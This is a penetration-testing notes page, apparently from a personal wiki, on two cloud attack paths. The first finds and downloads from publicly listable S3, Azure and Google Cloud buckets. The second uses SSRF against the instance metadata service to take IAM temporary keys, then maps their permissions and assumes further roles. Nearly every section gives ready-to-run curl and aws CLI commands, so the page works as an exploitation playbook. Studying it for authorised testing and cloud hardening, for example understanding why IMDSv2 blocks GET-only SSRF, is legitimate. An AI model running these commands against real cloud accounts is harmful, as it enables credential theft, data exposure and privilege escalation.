# Public Buckets and Metadata Credentials

Two cloud entry points that need nothing beyond `curl`: object storage left publicly listable, and an [[Security-Terms#^ssrf|SSRF]] that reaches the instance metadata service ([[Security-Terms#^imds|IMDS]]) and walks out with the instance role's temporary keys. They feed each other — a bucket leaks the hint, the metadata service leaks the keys, the keys open the buckets that were closed.

## Guess bucket names

```bash
for s in backups dev prod assets staging logs; do echo "$s $(curl -s -o /dev/null -w '%{http_code}' https://<company>-$s.s3.amazonaws.com/)"; done
```

- `-o /dev/null -w '%{http_code}'` → discard the body and print only the status code, so each candidate costs one line.
- `404` → no such bucket. `403` → the bucket **exists** but is closed; keep the name, a key found later may open it. `200` → exists and lists. `301` → exists, but you hit the wrong regional endpoint; the `<Endpoint>` in the body names the right one.

```bash
cloud_enum -k <company>
```

- `-k` → keyword; it mutates the keyword with its own suffix list and checks AWS, Azure and Google Cloud in one run. Repeat `-k` for brand variants. Install with `sudo apt install cloud-enum`.
- on an internal or self-hosted target, an S3-compatible store (MinIO) usually listens on port `9000`; the listing below works there path-style: `http://<host>:9000/<bucket>/`.

## List and pull a public bucket

```bash
curl -s https://<bucket>.s3.amazonaws.com/ | grep -oP '(?<=<Key>)[^<]+'
```

- the listing is XML; the `grep -oP` lookbehind prints only the object keys, one per line. The same pipe works on `https://storage.googleapis.com/<bucket>` for Google Cloud.
- one response holds at most 1000 keys; if the body contains `<IsTruncated>true</IsTruncated>`, ask for the next page with `?marker=<last key>`.

Triage the keys by value — backups and dumps first, then config and secrets, then source, then logs:

```bash
curl -s https://<bucket>.s3.amazonaws.com/ | grep -oP '(?<=<Key>)[^<]+' | grep -iE 'backup|dump|\.sql|\.bak|\.env|cred|config|\.zip|\.tar|\.gz|\.log'
```

```bash
aws s3 ls s3://<bucket> --recursive --no-sign-request
```

```bash
aws s3 cp s3://<bucket>/<key> . --no-sign-request
```

- `--no-sign-request` → send the request anonymously. Leave it out and the CLI tries to sign with local keys; with none configured it stops at `Unable to locate credentials` without ever touching the bucket.
- `--recursive` → walks every prefix and handles the 1000-key paging for you.

```bash
curl -s "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list"
```

- `restype=container&comp=list` → Azure needs both to return a listing; the bare container URL returns an error even when the container is public.
- listing works only at public access level **Container**; level **Blob** serves a blob you already know the name of, but refuses the list.

> [!warning]
> Quote every URL that contains `&`. Unquoted, the shell reads `&` as "run in the background" and cuts the command in two, so the request goes out without the parameters after it.

## SSRF to the metadata service

Any feature that makes the server fetch a URL you supply — image import, webhook tester, link preview — is a candidate; confirm the server does the fetching with [[SSRF]] first. Point it at the metadata address: the request leaves from inside the instance, so the metadata service answers, and the app hands the answer back to you.

```bash
curl -s "http://<target>/<fetch-path>?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

- the trailing `/` → this parent path returns the **role name**; the next call needs it.

```bash
curl -s "http://<target>/<fetch-path>?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
```

- returns JSON with `AccessKeyId` (starts with `ASIA`, the prefix of temporary keys), `SecretAccessKey`, `Token` and `Expiration`. The keys stop working at `Expiration`; fetch again for a fresh set.
- if the inner URL carries its own `?` or `&`, URL-encode it — `curl -sG "http://<target>/<fetch-path>" --data-urlencode "url=<inner-url>"` — or the app reads its parameters as its own.

```bash
curl -s "http://<target>/<fetch-path>?url=http://169.254.169.254/latest/user-data"
```

- user-data → the boot script the owner gave the instance; passwords and keys get pasted into it.

With a shell on the instance, drop the SSRF wrapper and query `169.254.169.254` directly. If a plain GET gets `401`, IMDSv2 is enforced and needs a token first:

```bash
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
```

```bash
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

- a GET-only SSRF can send neither the `PUT` nor the header, which is exactly why IMDSv2 stops it. `$TOKEN` lives only in the shell that set it.

Azure and Google Cloud demand a header on every metadata request, so a plain-GET SSRF fails against them by default; they fall to an SSRF that lets you set headers, or to a shell:

```bash
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

```bash
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

- missing header → Azure answers `400`, Google `403`. Both return an `access_token` for the instance's identity.

## Work out what the keys can do

Load them as in [[AWS-Cognito-Identity-Pool-to-DynamoDB#Load the keys and confirm who you are]]. The metadata field is called `Token`, the variable is `AWS_SESSION_TOKEN` — the names do not match, and skipping it makes every call fail with `InvalidClientTokenId`.

```bash
aws sts get-caller-identity
```

- the `Arn` reads `assumed-role/<role>/<session>`; the role name is what the calls below take.

```bash
aws iam list-attached-role-policies --role-name <role>
```

```bash
aws iam list-role-policies --role-name <role>
```

- attached → managed policies; role-policies → inline ones. A role can carry either or both, so one call alone can show an empty list on a loaded role.

```bash
aws iam get-policy --policy-arn <arn>
```

```bash
aws iam get-policy-version --policy-arn <arn> --version-id <DefaultVersionId>
```

```bash
aws iam get-role-policy --role-name <role> --policy-name <name>
```

- `--version-id` is required; take `DefaultVersionId` from `get-policy`, the version that is actually in force.
- these IAM reads are often denied to the role itself. A denial says nothing about the role's reach — test the service directly (`aws s3 ls`).

## Read the policy

- `Action` and `Resource` first: `*`, or a service wildcard such as `s3:*` or `iam:*`, grants everything in its scope. In a bucket policy, `"Principal": "*"` means anyone on the internet.
- an explicit `Deny` beats every `Allow`, so a wildcard `Allow` beside a `Deny` is not full access — read the whole document before you claim it.
- `NotAction` with `"Effect": "Allow"` grants everything **except** the actions listed: it reads narrow and is wide.
- a role you are allowed to assume is a privilege-escalation path; its trust policy (`AssumeRolePolicyDocument` in `aws iam get-role`) lists who may assume it.

```bash
aws sts assume-role --role-arn <arn> --role-session-name <any-name>
```

- `--role-session-name` is required; it returns a new key set to load the same way.
